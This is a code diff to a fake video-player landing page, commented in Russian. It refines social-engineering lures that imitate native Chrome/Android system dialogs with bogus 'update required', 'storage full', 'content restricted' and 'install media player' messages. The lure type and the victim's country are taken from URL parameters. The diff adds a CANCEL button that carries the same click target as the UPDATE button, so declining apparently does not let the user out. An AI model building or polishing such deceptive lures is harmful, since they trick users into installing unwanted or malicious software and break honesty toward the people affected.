@@ -69,27 +69,27 @@
         return l;
       };
 
-      // --- СЛОВАРЬ В СТИЛЕ СИСТЕМНЫХ УВЕДОМЛЕНИЙ ---
+      // --- СЛОВАРЬ (EXIT MODAL + СИСТЕМНЫЕ ТИПЫ) ---
       const MODAL_I18N = {
         en: {
           title: "Leaving already? 😢",
           desc: "Wait—video is almost loaded.",
           stay: "Stay",
           leave: "Leave",
-          t1: { h: "Update required", t: "Your browser version is no longer supported. Please update Chrome to play this video.", b: "UPDATE" },
-          t2: { h: "Storage limit reached", t: "To continue playback, please clear your browser cache or system junk files.", b: "CLEAR NOW" },
-          t3: { h: "Content restricted", t: "This media is restricted in {country}. Please enable secure connection to watch.", b: "ENABLE" },
-          t4: { h: "Playback Error", t: "A newer version of the media player is required to play this content.", b: "INSTALL" }
+          t1: { h: "Update required", t: "Your browser version is no longer supported. Please update Chrome to play this video.", b: "UPDATE", c: "CANCEL" },
+          t2: { h: "Storage limit reached", t: "To continue playback, please clear your browser cache or system junk files.", b: "CLEAR NOW", c: "CANCEL" },
+          t3: { h: "Content restricted", t: "This media is restricted in {country}. Please enable secure connection to watch.", b: "ENABLE", c: "CANCEL" },
+          t4: { h: "Playback Error", t: "A newer version of the media player is required to play this content.", b: "INSTALL", c: "CANCEL" }
         },
         ru: {
           title: "Уже уходишь? 😢",
           desc: "Подожди! Видео почти загрузилось.",
           stay: "Остаться",
           leave: "Уйти",
-          t1: { h: "Требуется обновление", t: "Ваша версия браузера больше не поддерживается. Обновите Chrome для просмотра видео.", b: "ОБНОВИТЬ" },
-          t2: { h: "Память переполнена", t: "Для продолжения воспроизведения очистите кэш браузера или системный мусор.", b: "ОЧИСТИТЬ" },
-          t3: { h: "Доступ ограничен", t: "Этот контент недоступен в регионе {country}. Включите безопасное соединение.", b: "ВКЛЮЧИТЬ" },
-          t4: { h: "Ошибка декодирования", t: "Для воспроизведения этого контента требуется обновить медиа-плагин.", b: "УСТАНОВИТЬ" }
+          t1: { h: "Требуется обновление", t: "Ваша версия браузера больше не поддерживается. Обновите Chrome для просмотра.", b: "ОБНОВИТЬ", c: "ОТМЕНА" },
+          t2: { h: "Память переполнена", t: "Для продолжения воспроизведения очистите кэш браузера или системный мусор.", b: "ОЧИСТИТЬ", c: "ОТМЕНА" },
+          t3: { h: "Доступ ограничен", t: "Этот контент недоступен в регионе {country}. Включите безопасное соединение.", b: "ВКЛЮЧИТЬ", c: "ОТМЕНА" },
+          t4: { h: "Ошибка декодирования", t: "Для воспроизведения этого контента требуется обновить медиа-компоненты.", b: "УСТАНОВИТЬ", c: "ОТМЕНА" }
         }
       };
 
@@ -98,7 +98,7 @@
         return MODAL_I18N[lang] || MODAL_I18N.en;
       };
 
-      // Инъекция текстов в "реалистичную" плашку
+      // Логика подмены текста в системном диалоге
       document.addEventListener("DOMContentLoaded", () => {
         const typeId = sp.get('type') || '4';
         const country = sp.get('geo') || sp.get('country') || "Your Region";
@@ -109,9 +109,12 @@
         const elHead = document.getElementById('lure-head');
         const elText = document.getElementById('lure-text');
         const elBtn  = document.getElementById('lure-btn');
+        const elCancel = document.getElementById('lure-cancel');
+
         if (elHead) elHead.innerText = content.h;
         if (elText) elText.innerText = textBody;
         if (elBtn)  elBtn.innerText  = content.b;
+        if (elCancel) elCancel.innerText = content.c;
       });
     })();
   </script>
@@ -126,11 +129,8 @@
     }
 
     .xh-zone {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      pointer-events: auto;
+      display: flex; align-items: center; justify-content: center;
+      cursor: pointer; pointer-events: auto;
       -webkit-tap-highlight-color: transparent;
     }
 
@@ -142,15 +142,11 @@
       border-radius: 50%; background: rgba(30,30,30,0.5); border: 1px solid rgba(255,255,255,0.1);
     }
 
-    .xh-main-screen {
-      position: absolute; inset: 0;
-      display: flex; align-items: center; justify-content: center; z-index: 10;
-    }
-
+    .xh-main-screen { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 10; }
     .xh-video-container { width: 100%; max-width: 1220px; aspect-ratio: 16 / 9; position: relative; background: #000; }
     .xh-video-element { width: 100%; height: 100%; object-fit: cover; display: block; }
 
-    /* --- СТИЛЬ "РЕАЛИЗМ" (NATIVE SYSTEM DIALOG) --- */
+    /* --- ФИЛОСОФИЯ РЕАЛИЗМА: NATIVE DIALOG --- */
     .xh-main-play-trigger {
       position: absolute; top: 50%; left: 50%;
       transform: translate(-50%, -50%);
@@ -162,32 +158,35 @@
     .xh-main-play-trigger.ready { opacity: 1; visibility: visible; pointer-events: auto; }
 
     .system-dialog {
-        background: #ffffff; /* Чистый белый как в системных окнах */
+        background: #ffffff;
         border-radius: 8px;
         padding: 24px;
         width: 300px;
-        box-shadow: 0 12px 28px rgba(0,0,0,0.3);
-        text-align: left; /* Важно: левое выравнивание */
+        box-shadow: 0 12px 32px rgba(0,0,0,0.4);
+        text-align: left;
         color: #202124;
     }
 
     .dialog-title { font-size: 19px; font-weight: 500; margin-bottom: 12px; color: #000; }
     .dialog-text { font-size: 14px; color: #5f6368; margin-bottom: 24px; line-height: 1.5; }
     
-    .dialog-actions { display: flex; justify-content: flex-end; } /* Кнопка справа внизу */
+    .dialog-actions { display: flex; justify-content: flex-end; gap: 8px; }
     
     .dialog-btn {
         background: transparent;
-        color: #1a73e8; /* Синий Chrome/Android */
+        color: #1a73e8; /* Chrome Blue */
         border: none;
-        padding: 8px 12px;
+        padding: 10px 16px;
         font-size: 14px;
         font-weight: 600;
         cursor: pointer;
         text-transform: uppercase;
-        letter-spacing: 0.5px;
+        letter-spacing: 0.4px;
+        border-radius: 4px;
     }
-    .dialog-btn:active { background: rgba(26, 115, 232, 0.1); border-radius: 4px; }
+
+    .dialog-btn.btn-secondary { color: #5f6368; } /* Cancel button color */
+    .dialog-btn:active { background: rgba(26, 115, 232, 0.1); }
     /* --- END REALISM --- */
 
     .xh-bottom-interface {
@@ -243,7 +242,8 @@
             <div class="dialog-title" id="lure-head">Update Required</div>
             <div class="dialog-text" id="lure-text">Please update your system components to play this media.</div>
             <div class="dialog-actions">
-                <button class="dialog-btn" id="lure-btn">UPDATE</button>
+                <button class="dialog-btn btn-secondary" id="lure-cancel" data-target="main_play">CANCEL</button>
+                <button class="dialog-btn" id="lure-btn" data-target="main_play">UPDATE</button>
             </div>
         </div>
       </div>
